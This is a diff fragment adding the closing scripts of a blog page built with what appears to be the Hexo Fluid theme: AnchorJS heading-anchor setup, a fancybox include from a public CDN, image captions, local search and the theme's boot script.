+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
